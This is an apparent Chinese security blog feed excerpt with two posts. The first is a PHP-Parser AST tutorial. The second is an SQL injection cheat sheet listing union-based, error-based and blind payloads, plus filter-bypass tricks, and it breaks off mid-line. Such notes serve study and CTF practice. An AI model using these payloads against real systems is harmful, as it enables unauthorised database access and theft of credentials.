        <content type="html"><![CDATA[<h1 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h1><p>👴想写一个自动化寻找 php 反序列化链的小玩意。</p><p>最开始写项目的驱动是黄总说要准备国赛的项目赛，然后表示“今年不能像去年一样鸽掉了”，再然后在一次开会上，双方也是相视一笑：“嘿嘿，嘿嘿”，也就这么搁置下来了。然后说要我们准备好带好下一届，让他们搞，然后看了看这群兔崽子，彳亍……还远着。然后现在是确实自己有了想搞的动力（原因不明），突然，欸就很想搞了，所以就再捡起来。</p><p>但是对于大概的项目流程还是蛮不理解，又是自己一个人搞，就先摸索研究一下。在网上找了很久找到了 <code>PHP-Parser</code> 这个工具，是专门做 PHP AST 的，简单介绍一下吧</p><hr><p>PHP-Parser 的项目主页是 <a href="https://github.com/nikic/PHP-Parser%E3%80%82%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%A4%9A%E7%89%88%E6%9C%AC%E7%9A%84">https://github.com/nikic/PHP-Parser。可以对多版本的</a> PHP 进行完美解析，生成一个抽象语法树</p><p>对于词法分析，PHP 有个内置函数 <code>token_get_all()</code> 可以用来获取 TOKENS，作为语法分析的输入，这个开源项目也是用的 <code>token_get_all()</code> 生成的 token 流</p><blockquote><p>不过话说回来，AST，即 Abstract Syntax Tree，也就是抽象语法树，它是源代码语法结构的一种抽象表示，可以将你所写的的代码用树状结构化表现出来</p></blockquote><hr><p>那么话不多说，直接开整吧</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>可以使用 PHP 的包管理工具 composer 添加，在项目目录执行命令 <code>php composer.phar require nikic/php-parser</code> 即可，如果没有下载 composer，就先执行 <code>curl -s http://getcomposer.org/installer | php</code> 来安装。</p><h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><p>跟着<a href="https://github.com/nikic/PHP-Parser/tree/master/doc">官方文档</a> 学了。</p><h3 id="基本组成语法"><a href="#基本组成语法" class="headerlink" title="基本组成语法"></a>基本组成语法</h3><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>如果要使用这个库的话，首先要将 composer 生成的自动装带器给包含进来，可以使用 <code>require &#39;path/to/vendor/autoload.php&#39;;</code>。</p><p>另外，你可以把 <code>xdebug.max_nesting_level</code> 设置为更高的值：<code>ini_set(&#39;xdebug.max_nesting_level&#39;, 3000);</code>。</p><p>这样可以确保遍历高度嵌套的节点树时不会出现错误，但是最好完全禁用 Xdebug，因为它很容易使该库的运行速度慢五倍以上。</p><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><p>我们可以创造一个 parser（解析器）实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br></pre></td></tr></table></figure><p>这个工厂类接受一个参数以区别对待不同版本的 PHP：</p><table><thead><tr><th>Kind</th><th>Behavior</th></tr></thead><tbody><tr><td>ParserFactory::PREFER_PHP7</td><td>尝试将代码解析为PHP7。如果失败，请尝试将其解析为PHP 5</td></tr><tr><td>ParserFactory::PREFER_PHP5</td><td>尝试将代码解析为PHP5。如果失败，请尝试将其解析为PHP 7</td></tr><tr><td>ParserFactory::ONLY_PHP7</td><td>将代码解析为PHP7</td></tr><tr><td>ParserFactory::ONLY_PHP5</td><td>将代码解析为PHP5</td></tr></tbody></table><p>除非有更好的选择，一般默认用 <code>PREFER_PHP7</code>，<code>create()</code> 方法可以选择性地接受 <code>Lexer</code> 作为第二个参数，这个我们姑且不做研究。</p><p>然后，我们可以把我们需要 AST 化的 PHP 代码传递给 parse 方法，如果遇到了语法错误，将会抛出 <code>PhpParser\Error</code> 异常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = &lt;&lt;&lt;<span class="string">&#x27;CODE&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLine</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">printLine(<span class="string">&#x27;Hello World!!!&#x27;</span>);</span><br><span class="line">CODE;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmts</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">    <span class="comment">// $stmts is an array of statement nodes</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Parse Error: &#x27;</span>, <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个 parser 实例可以重复使用以解析多个文件。</p><h4 id="节点转储"><a href="#节点转储" class="headerlink" title="节点转储"></a>节点转储</h4><p>如果要以人可读的方式去转储 AST 的话，可以使用 <code>NodeDumper</code>；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nodeDumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nodeDumper</span>-&gt;dump(<span class="variable">$stmts</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于之前的实例，将会输出如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    0: Stmt_Function(</span><br><span class="line">        attrGroups: array(</span><br><span class="line">        )</span><br><span class="line">        byRef: false</span><br><span class="line">        name: Identifier(</span><br><span class="line">            name: printLine</span><br><span class="line">        )</span><br><span class="line">        params: array(</span><br><span class="line">            0: Param(</span><br><span class="line">                attrGroups: array(</span><br><span class="line">                )</span><br><span class="line">                flags: 0</span><br><span class="line">                type: null</span><br><span class="line">                byRef: false</span><br><span class="line">                variadic: false</span><br><span class="line">                var: Expr_Variable(</span><br><span class="line">                    name: msg</span><br><span class="line">                )</span><br><span class="line">                default: null</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        returnType: null</span><br><span class="line">        stmts: array(</span><br><span class="line">            0: Stmt_Echo(</span><br><span class="line">                exprs: array(</span><br><span class="line">                    0: Expr_Variable(</span><br><span class="line">                        name: msg</span><br><span class="line">                    )</span><br><span class="line">                    1: Scalar_String(</span><br><span class="line">                        value: </span><br><span class="line">                    </span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    1: Stmt_Expression(</span><br><span class="line">        expr: Expr_FuncCall(</span><br><span class="line">            name: Name(</span><br><span class="line">                parts: array(</span><br><span class="line">                    0: printLine</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            args: array(</span><br><span class="line">                0: Arg(</span><br><span class="line">                    name: null</span><br><span class="line">                    value: Scalar_String(</span><br><span class="line">                        value: Hello World!!!</span><br><span class="line">                    )</span><br><span class="line">                    byRef: false</span><br><span class="line">                    unpack: false</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们还可以通过使用 <code>php-parse</code> 脚本，使用文件名或者代码字符串调用它来获取 AST：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vendor/bin/php-parse test.php</span><br><span class="line">vendor/bin/php-parse &quot;&lt;?php foo();&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/8YoSePjMbZUhdXm.png"></p><p>如果想要快速获取 AST 中某些语法的表达方式的话，这样就很可。</p><h4 id="节点🌳结构"><a href="#节点🌳结构" class="headerlink" title="节点🌳结构"></a>节点🌳结构</h4><p>观察上面的节点转储，我们可以发现上面代码中的 <code>$stms</code> 是两个节点的数组，一个 <code>Stmt_Function</code> 和一个 <code>Stmt_Expression</code> 节点，它们所对应的类名称为：</p><ul><li><code>Stmt_Function</code> -&gt; <code>PhpParser\Node\Stmt\Function_</code></li><li><code>Stmt_Expression</code> -&gt; <code>PhpParser\Node\Stmt\Expression</code></li></ul><p>可能有人注意到了 Function 类的最后面多了一个 <code>_</code>，但是 Function 是一个保留关键字，该库中的许多节点类名称都带有尾随 <code>_</code>，以避免与关键字冲突。</p><p>因为 PHP 是一种大型语言，所以大概有140多个不同的节点，为了更好地使用它们，将它们分为了三类：</p><ul><li><code>PhpParser\Node\Stmt</code> 是语句节点，即不返回值并且不能出现在表达式中的语言构造，例如类定义就是一个语句，因为它没有返回值所以我们不能构造像 <code>func(class A &#123;&#125;);</code> 这样的语句</li></ul><ul><li><code>PhpParser\Node\Expr</code> 是表达式节点，即返回值的语言构造，因此可以在其他表达式中出现，表达式的实例如：<ul><li><code>$var</code> (<code>PhpParser\Node\Expr\Variable</code>)</li><li><code>func()</code> (<code>PhpParser\Node\Expr\FuncCall</code>)</li></ul></li><li><code>PhpParser\Node\Scalar</code> 是表示标量值的节点，比如 <code>&#39;string&#39;</code> (<code>PhpParser\Node\Scalar\String_</code>)，<code>0</code> (<code>PhpParser\Node\Scalar\LNumber</code>）或者魔术常数比如 <code>__FILE__</code> (<code>PhpParser\Node\Scalar\MagicConst\File</code>)，所有的<code>PhpParser\Node\Scalars</code>都扩展了<code>PhpParser\Node\Expr</code>，因为标量也是表达式。</li><li>这两个组都不存在某些节点，比如名称（<code>PhpParser\Node\Name</code>）和调用参数（<code>PhpParser\Node\Arg</code>）的节点。</li></ul><p><code>Node\Stmt\Expression</code>节点有点令人迷惑，因为它既有术语 statement 又有 expression，这个节点有别于被称为 <code>Node\Expr</code> 的 expr，是一个由表达式 <code>Node\Stmt\Expression</code> 代表的包含 expr 作为子节点的 expression statement。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PROJECT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小谈SQL注入</title>
      <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>SQL 注入这方面一直挺菜的，整理一下吧</p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><h3 id="判断-column-数及回显数据字段位置"><a href="#判断-column-数及回显数据字段位置" class="headerlink" title="判断 column 数及回显数据字段位置"></a>判断 column 数及回显数据字段位置</h3><ul><li><code>order/group by N</code></li><li><code>union select 1,2,3...N</code></li></ul><hr><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可</li><li>注意一定要拼接够足够的字段数，否则 SQL 语句报错。PS：此方法也可作为判断前条 select 语句的方法之一</li></ul><hr><h3 id="爆库、表、字段"><a href="#爆库、表、字段" class="headerlink" title="爆库、表、字段"></a>爆库、表、字段</h3><ul><li><p>MySQL version &lt; 5.0</p><ul><li><p>由于 MySQL 的低版本缺乏系统库<code>information_schema</code>，故通常情况下，我们无法直接查询表名，字段（列）名等信息</p><p>这时候只能靠猜来解决，直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据</p><p>若知道仅表名而不知道列（字段）名，可以尝试：</p><ul><li><p>单字段：<code>select *,1,2,xxx from table_name</code></p></li><li><p>多字段：<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p></li></ul></li></ul></li><li><p>MySQL version &gt;= 5.0</p><ul><li><p>爆 schema</p><ul><li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li></ul></li><li><p>爆 table</p><ul><li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p></li><li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p></li></ul></li><li><p>爆 column</p><ul><li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li><li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li></ul></li><li><p>出</p><ul><li><code>select heart from Du1</code></li><li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li></ul></li></ul></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>通过特殊函数的报错使其参数被页面输出</p><hr><p>前提：</p><ul><li>服务器开启报错信息返回，也就是发生错误时返回报错信息</li></ul><p>注意：</p><ul><li>报错函数通常有最长报错输出的限制，面对这种情况，可以进行分割输出<ul><li><code>#define ERRMSGSIZE (512)</code></li></ul></li><li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用 group_concat 等函数聚合数据即可</li></ul><hr><h3 id="利用-overflow"><a href="#利用-overflow" class="headerlink" title="利用 overflow"></a>利用 overflow</h3><p>注：MySQL version &gt; 5.5.5 的时候 overflow 才会有错误讯息，MySQL version &gt; 5.5.53 的时候不会显示查询结果</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>适用版本：5.5.49~5.5.5</p><p>该函数会返回 e 的 x 次方结果</p><p>因为 MySQL 能记录的 double 数值范围有限，一旦结果超过范围，则该函数报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307</span><br><span class="line">SELECT exp(710) &#x3D;&gt; ERROR</span><br></pre></td></tr></table></figure><p>故可作 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(SELECT * FROM (SELECT user())x));</span><br><span class="line">ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;</span><br></pre></td></tr></table></figure><p>按理来说 <code>pow</code> 应该也可以，原理相同</p><hr><h4 id="bigint-数值操作"><a href="#bigint-数值操作" class="headerlink" title="bigint 数值操作"></a>bigint 数值操作</h4><p>利用了当 MySQL 数据库的某些边界数值进行数值运算时，会报错的原理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0 &#x3D;&gt; 18446744073709551615</span><br><span class="line">SELECT ~0 + 1 &#x3D;&gt; ERROR</span><br><span class="line">SELECT cot(0) &#x3D;&gt; ERROR</span><br><span class="line"></span><br><span class="line">select !(select * from(select user())a)-~0;</span><br><span class="line">select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><h3 id="利用-xpath"><a href="#利用-xpath" class="headerlink" title="利用 xpath"></a>利用 xpath</h3><h4 id="extractvalue-长度限制32位"><a href="#extractvalue-长度限制32位" class="headerlink" title="extractvalue (长度限制32位)"></a>extractvalue (长度限制32位)</h4><p>原理：前后添加 ~ 使其不符合 xpath 格式从而报错</p><p>适用版本 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h4 id="updatexml-长度限制32位"><a href="#updatexml-长度限制32位" class="headerlink" title="updatexml (长度限制32位)"></a>updatexml (长度限制32位)</h4><p>适用版本 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h3 id="利用虚拟表报错-主键重复"><a href="#利用虚拟表报错-主键重复" class="headerlink" title="利用虚拟表报错 / 主键重复"></a>利用虚拟表报错 / 主键重复</h3><p>原理：简单来说，是由于 where 条件每执行一次，rand 函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故 <code>rand()</code> 不能后接在<code>order/group by</code> 上</p><hr><p>举栗子：</p><p>假设 USER 表有三条数据，我们通过：<code>select * from USER group by username</code> 来通过其中的 username 字段进行分组</p><p>此过程会先建立一个虚拟表，存在两个字段：<code>key，count</code></p><p>其中我们通过 username 来判断，其在此处是字段，首先先取第一行的数据：<code>username=Du1&amp;password=0312</code></p><p>username 为 Du1 出现一次，则现在虚表内查询是否存在 Du1，若存在，则 count + 1，若不存在，则添加 Du1，其 count 为 1</p><p>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成 0 ~ 1 之间随机一个小数、<code>floor()</code>取整数部分、0 是随机因子、乘 2 是为了让大于 0.5 的小数通过 floor 函数得 1</p><p>若表中有三行数据：我们通过<code>select * from USER group by floor(rand(0)*2)</code>进行排序的话</p><blockquote><p>注意：</p><p>由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011……</p></blockquote><p>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为 0，接着在虚表内检索 0，发现虚表没有键值为 0 的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果 1，于是虚拟表插入的内容为<code>key=1&amp;count=1</code></p><p>第二次执行<code>group by</code>时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果 1，查询虚表发现数据存在，因而直接让虚表内的<code>key=1</code>的 count 加一即可，<code>floor(..)</code>只运行了一次</p><p>第三次执行<code>group by</code>时，<code>floor(rand(0)*2)</code>被执行第四次，得到结果 0，查询虚表不存在。再插入虚表时，<code>floor(…)</code>被执行第五次，得到结果 1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段 key 为主键，具有不可重复性，故虚表在尝试插入时将产生错误</p><hr><p>故可作 payload：<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p><p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p><p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p><h3 id="利用几何函数"><a href="#利用几何函数" class="headerlink" title="利用几何函数"></a>利用几何函数</h3><ul><li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygon：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestring：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygon：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h3 id="利用不存在的函数"><a href="#利用不存在的函数" class="headerlink" title="利用不存在的函数"></a>利用不存在的函数</h3><p>随便用一个不存在的函数，可能会摸奖得到当前所在的数据库名称</p><p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p><h3 id="利用-name-const"><a href="#利用-name-const" class="headerlink" title="利用 name_const"></a>利用 name_const</h3><p>仅可取数据库版本信息</p><p>payload：<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p><h3 id="uuid-相关函数"><a href="#uuid-相关函数" class="headerlink" title="uuid 相关函数"></a>uuid 相关函数</h3><p>适用版本：8.0.x</p><p>because of 参数格式不正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><p>这个👴还没测</p><h3 id="GTID-相关函数"><a href="#GTID-相关函数" class="headerlink" title="GTID 相关函数"></a>GTID 相关函数</h3><p>同样也是参数格式不正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p><h3 id="join-using-注列名"><a href="#join-using-注列名" class="headerlink" title="join using 注列名"></a>join using 注列名</h3><p>通过系统关键词 join 可建立两个表之间的内连接，通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因（相同列名存在）而发生错误，并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><p>👴不咋懂，希望哪位SQL👴可以带带👴</p><h3 id="ST-相关函数"><a href="#ST-相关函数" class="headerlink" title="ST 相关函数"></a>ST 相关函数</h3><p>MySQL 5.7</p><ul><li><code>select ST_LatFromGeoHash(version());</code></li><li><code>select ST_LongFromGeoHash(version());</code></li><li><code>select ST_PointFromGeoHash(version(),1);</code></li></ul><p><img src="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png"></p><hr><h3 id="报错函数速查表"><a href="#报错函数速查表" class="headerlink" title="报错函数速查表"></a>报错函数速查表</h3><p>注：默认MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>类别</th><th>函数</th><th>版本需求</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>函数显错长度</th><th>Mysql报错内容长度</th><th>额外限制</th></tr></thead><tbody><tr><td>主键重复</td><td>floor round</td><td>❓</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td>64</td><td></td><td>data_type ≠ varchar</td></tr><tr><td>列名重复</td><td>name_const</td><td>❓</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td>only version()</td></tr><tr><td></td><td>join</td><td>[5.5.49, ?)</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td>only columns</td></tr><tr><td>数据溢出 - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>数据溢出 - BIGINT</td><td></td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>几何对象</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>空间函数 Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>✔️</td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>✔️</td><td>✔️</td><td>✔️</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>✔️</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td>32</td><td></td><td></td></tr></tbody></table><p>摘自——<a href="https://blog.sari3l.com/posts/9622f295/">Mysql 注入基础小结</a></p><hr><h2 id="Blind-Based"><a href="#Blind-Based" class="headerlink" title="Blind Based"></a>Blind Based</h2><h3 id="Boolean（1-or-0）"><a href="#Boolean（1-or-0）" class="headerlink" title="Boolean（1 or 0）"></a>Boolean（1 or 0）</h3><ul><li><code>id=87 and length(user())&gt;0</code></li><li><code>id=87 and length(user())&gt;100</code></li><li><code>id=87 and ascii(mid(user(),1,1))&gt;100</code></li><li><code>id=87 or ((select user()) regexp binary &#39;^[a-z]&#39;)</code></li></ul><h3 id="Time（无回显）"><a href="#Time（无回显）" class="headerlink" title="Time（无回显）"></a>Time（无回显）</h3><ul><li><code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code></li><li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li><li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li></ul><h2 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h2><h3 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h3><ol><li>双写 anandd、oorr</li><li>使用运算符代替 &amp;&amp;、||</li><li>直接拼接 = 号，such as <code>?id=1=(condition)</code></li><li>其他方法，such as <code>?id=1^(condition)</code></li><li>大小写</li><li>urlencode</li></ol><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ol><li>多层空格嵌套</li><li>改用 +</li><li>使用注释 /**/</li><li>and / or 后面可以跟上偶数个 !、~ 可以替代空格，也可以混合使用（规律又不同）</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code> 等部分不可见字符可也代替空格</li></ol><p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><ul><li>order by 大小比较盲注</li></ul><p>不懂QAQ，求教</p><h3 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h3><ol><li>改用盲注</li><li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM 